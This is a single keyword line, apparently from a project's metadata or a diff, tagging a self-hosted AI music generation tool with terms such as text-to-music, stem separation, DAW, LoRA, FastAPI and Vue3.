+Keywords: ace-step, ai-music, apple-silicon, daw, demucs, fastapi, generative-ai, local-ai, lora, macos, midi, music-generation, music-production, self-hosted, stem-separation, text-to-music, typescript, vue3, yue2, yue2-3b
